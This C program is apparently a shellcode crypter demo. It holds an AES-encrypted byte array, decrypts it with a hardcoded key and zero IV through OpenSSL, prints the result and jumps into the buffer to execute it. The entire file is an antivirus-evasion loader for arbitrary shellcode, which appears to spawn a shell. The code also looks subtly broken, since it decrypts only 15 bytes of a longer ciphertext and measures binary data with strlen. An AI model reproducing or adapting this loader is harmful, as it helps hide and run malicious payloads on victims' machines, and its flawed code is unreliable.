#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include"openssl/aes.h"

main()
{
    /* Settting Key and Buffers */
    unsigned char key[16];
    strcpy((char *) key,"012345678912345");
    unsigned char iv[AES_BLOCK_SIZE];
    memset(iv, 0x00, AES_BLOCK_SIZE);

    /* Encrypted Shellcode */
    unsigned char ciphertext[] = \
"\x67\xec\x5f\xd3\x4b\x9c\x71\xd2\x56\xb\xf3\x36\x54\xfd\xe5\x60\x3f\x49\x1e\x72\x8c\xca\x28\xd2\x8f\xfd\x28\xaa\x3c\x9c\x8d\x9b\x39\x5\xff\x89\x82\x17\x5d\xf2\x4\x60\x9b\x8e\xce\xb4\x39\x5\xff\x89\x82\x17\x5d\xf2\x4\x60\x9b\x8e\xce\xb4\x7e\xef\x6a\xb\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68";


    /* Decryption */
    unsigned char shellcode[sizeof(ciphertext)];
    AES_KEY dec_key;
    memset(iv, 0x00, AES_BLOCK_SIZE); 
    AES_set_decrypt_key(key, sizeof(key)*8, &dec_key); // Size of key is in bits
    AES_cbc_encrypt(ciphertext, shellcode, 15, &dec_key, iv, AES_DECRYPT);

    printf("[*] Recovered Original Shellcode: \n");

    for (int i = 0; i < strlen(shellcode); i++) {
 
                printf("\\x%x", shellcode[i]);
    }

    printf("\n[*] Shellcode Length:  %d\n", strlen(shellcode));

	int (*ret)() = (int(*)())shellcode;

	ret();

}
